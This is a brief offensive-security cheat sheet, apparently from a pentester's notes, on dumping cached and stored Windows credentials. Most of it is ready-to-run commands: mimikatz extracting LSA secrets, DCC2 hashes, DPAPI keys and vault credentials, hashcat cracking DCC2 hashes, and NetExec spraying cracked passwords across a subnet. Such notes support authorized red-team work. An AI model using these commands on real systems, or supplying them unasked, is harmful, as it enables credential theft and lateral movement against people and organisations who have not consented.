---
tags:
  - Credential_Access
  - Foundational
  - Windows
---

## Credential Dumping - Cached and Stored
resources: [HackTricks Cached Credentials](https://book.hacktricks.xyz/windows-hardening/stealing-credentials#cached-credentials)

> [!info] Extract cached domain credentials, LSA secrets, DPAPI keys, and Credential Manager vaults.

### LSA Secrets - Service Account Passwords
> [!tip] Contains service account passwords, autologon credentials, VPN passwords.

```cmd
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit" > lsa_secrets.txt
```

### Cached Domain Credentials - DCC2
> [!info] Cached domain logon hashes. Crack with **hashcat** `-m 2100`.

```cmd
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::cache" "exit" > cached_creds.txt
```

```bash
hashcat -m 2100 cached_creds.txt rockyou.txt
```

### DPAPI Master Keys
> [!info] Used to decrypt Windows secrets (browser passwords, saved credentials).

```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::dpapi" "exit" > dpapi_keys.txt
```

### Credential Manager Vault
> [!tip] Stored Windows credentials (RDP, network shares, etc.).

```cmd
.\mimikatz.exe "privilege::debug" "token::elevate" "vault::cred /patch" "exit" > vault_creds.txt
```

```cmd
cmdkey /list > cmdkey_list.txt
```

### Validate Cracked DCC2 Credentials [Local]
> [!info] After cracking cached credentials with **hashcat** `-m 2100`.

```bash
nxc smb <DCIP> -u <Username> -p '<CrackedPassword>' -d <Domain>
```

```bash
nxc smb 192.168.1.0/24 -u <Username> -p '<CrackedPassword>' -d <Domain>
```
